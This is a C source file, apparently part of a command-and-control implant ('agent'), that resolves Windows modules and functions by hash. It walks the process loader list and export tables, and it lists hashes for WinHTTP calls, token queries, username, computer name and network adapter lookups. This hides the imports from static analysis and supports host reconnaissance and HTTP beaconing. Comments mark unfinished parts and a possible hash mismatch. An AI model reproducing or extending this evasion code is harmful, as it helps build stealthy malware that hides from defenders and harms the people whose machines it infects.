#include "evasive.h"


// Function to rotate the bits of a 64-bit unsigned integer to the right
UINT64 Rotr64(UINT64 value, UINT count) {
    const UINT mask = 8 * sizeof(value) - 1;
    count &= mask;
#pragma warning( push )
#pragma warning( disable : 4146)
    return (value >> count) | (value << ((-count) & mask));
#pragma warning( pop ) 

}

// Simple Rotr64 hash function for strings
UINT64 Rotr64HashA(const LPSTR str) {
    UINT64 hash = 0;
    for (int i = 0; i < StringLengthA(str); i++) {
        // Combine the current character with the hash using XOR
		hash = str[i] + Rotr64(hash, 7);
    }
    return hash;
}

UINT64 Rotr64HashW(const LPWSTR str) {
	UINT64 hash = 0;
	for (int i = 0; i < StringLengthW(str); i++) {
		// Combine the current character with the hash using XOR
		hash = str[i] + Rotr64(hash, 7);
	}
	return hash;
}
/*
****Hashing Order****

DllNameHashes = {
"kernel32.dll": 0x70E973267B32EF52,
"ntdll.dll" : 0xD99176CD993A6E6C,
"user32.dll" : 0xD99173267CB2F456,
"advapi32.dll" : 0x6C9973267A78625A,
"winhttp.dll" : 0xB591770E9D346F40,
"iphlpapi.dll" : 0x9CD9769E18786D3E,
}
ApiNameHashes = {
"winhttpopen": 0xA7C37F0E9D346F42,
"winhttpconnect" : 0x6B0E15CDF8F8755E,
"winhttpopenrequest" : 0xA71EFDB6F4215456,
"winhttpsendrequest" : 0xB71EFDB6F41C5D40,
"winhttpsetoption" : 0xB34E34E878B2F450,
"winhttpaddrequestheaders" : 0x63B35EF16C9C5613,
"winhttpreceiveresponse" : 0x5889BCB31EE4FF7,
"winhttpqueryheaders" : 0xBD2634B9EEABC71B,
"winhttpreaddata" : 0xBCCE1389F979714B,
"winhttpclosehandle" : 0x691AC4B750E3DE3F,
"rtlgetversion" : 0x934EBF2CBDBA663E,
"ntclose" : 0xE7BF663E9B800065,
"ntopenprocesstoken" : 0x97366C0AB4E7C04E,
"ntopenthreadtoken" : 0x9F25DD6892E0F340,
"ntqueryinformationtoken" : 0x326517A990EEDACA,
"rtlallocateheap" : 0x76A614FB1871F04A,
"rtlreallocateheap" : 0x76A5A4B9D2E3F04A,
"rtlrandomex" : 0x93B77E4DD8796D62,
"ntgettickcount" : 0x7516CBFD78F4F55E,
"getadaptersinfo" : 0x60CA9BF8197A7133,
"getusernamea" : 0x62EF0EEE5979F64B,
"getcomputernameexa" : 0xC91E0CD5361F344B,
"localalloc" : 0xDFB3661D9871F03B,
"localrealloc" : 0x9F13661CBCB6622B,
"localfree" : 0xCBCB36CC38F7EC65,
"getlocaltime" : 0x72DFA6CC38F7ED4F,
"getsystemtimeasfiletime" : 0x1262FEB90D685C11,
"getsystemmetrics" : 0x9776D5E62EF6E65D,
}
*/

LPVOID RetrieveModuleHandleFromHash(UINT64 hash) {
    P_INT_LDR_DATA_TABLE_ENTRY pModule = (P_INT_LDR_DATA_TABLE_ENTRY)((P_INT_PEB)agent->pTeb->ProcessEnvironmentBlock)->Ldr->InMemoryOrderLinks.Flink;
    P_INT_LDR_DATA_TABLE_ENTRY pFirstModule = pModule;

    do
    {
		UINT64 moduleNameHash = Rotr64HashW(pModule->BaseDllName.Buffer);
		if (moduleNameHash == hash) {
			return pModule->DllBase;
		}
		pModule = (P_INT_LDR_DATA_TABLE_ENTRY)pModule->InLoadOrderLinks.Flink;

	} while (pModule && pModule != pFirstModule);

    return INVALID_HANDLE_VALUE;
}

LPVOID RetrieveFunctionPointerFromhash(HMODULE Module, UINT64 Hash) {
	PIMAGE_NT_HEADERS pNtHeaders = NULL;
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;
	PDWORD pAddressOfFunctions = NULL;
	PDWORD pAddressOfNames = NULL;
	PWORD pAddressOfNameOrdinals = NULL;


    pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew);
	pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)Module + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	pAddressOfFunctions = (PDWORD)((LPBYTE)Module + pExportDirectory->AddressOfFunctions);
	pAddressOfNames = (PDWORD)((LPBYTE)Module + pExportDirectory->AddressOfNames);
	pAddressOfNameOrdinals = (PWORD)((LPBYTE)Module + pExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
        //TODO remove debug statements
	//	printf("FunctionName: %s\n", (LPSTR)((LPBYTE)Module + pAddressOfNames[i]));
		UINT64 functionNameHash = Rotr64HashA((LPSTR)((LPBYTE)Module + pAddressOfNames[i])); // there could be issues here because i used WSTR to generate hashes. Here we're using ASTR
	//	printf("FunctionNameHash: 0x%llX\n", functionNameHash);
        if (functionNameHash == Hash) {
			return (LPVOID)((LPBYTE)Module + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
		}
	}
	return NULL;
}

VOID RetrievePointerFromHash(UINT64 hash) {
	//TODO implement this function to retrieve a pointer from a hash
}

//TODO finish the putting the hashes into the agent using the config builder. maybe even put it in a custom section?
void printhashes() {

    UINT64 hash = 0;

    LPWSTR DllNames[] = {
		L"KERNEL32.DLL",
		L"ntdll.dll",
		L"user32.dll",
		L"advapi32.dll",
		L"winhttp.dll",
		L"iphlpapi.dll"
	};
	printf("DllNameHashes = {\n");
	for (int i = 0; i < sizeof(DllNames) / sizeof(DllNames[0]); i++) {
		hash = Rotr64HashW(DllNames[i]);
		printf("0x%llX, //%ls\n", hash, DllNames[i]);
	}
    printf("}\n");
    LPSTR apiNames[] = {
        "WinHttpOpen",
        "WinHttpConnect",
        "WinHttpOpenRequest",
        "WinHttpSendRequest",
        "WinHttpSetOption",
        "WinHttpAddRequestHeaders",
        "WinHttpReceiveResponse",
        "WinHttpQueryHeaders",
        "WinHttpReadData",
        "WinHttpCloseHandle",
        "RtlGetVersion",
        "NtClose",
        "NtOpenProcessToken",
        "NtOpenThreadToken",
        "NtQueryInformationToken",
        "RtlAllocateHeap",
        "RtlReAllocateHeap",
        "RtlRandomEx",
        "NtGetTickCount",
        "GetAdaptersInfo",
        "GetUserNameA",
        "GetComputerNameExA",
        "LocalAlloc",
        "LocalReAlloc",
        "LocalFree",
        "LoadLibraryA",
        "GetLocalTime",
        "GetSystemTimeAsFileTime",
        "GetSystemMetrics"
    };
	printf("ApiNameHashes = {\n");
	for (int i = 0; i < sizeof(apiNames) / sizeof(apiNames[0]); i++) {
		hash = Rotr64HashA(apiNames[i]);
        printf("0x%llX, //%s\n", hash, apiNames[i]);
	}
	printf("}\n");
}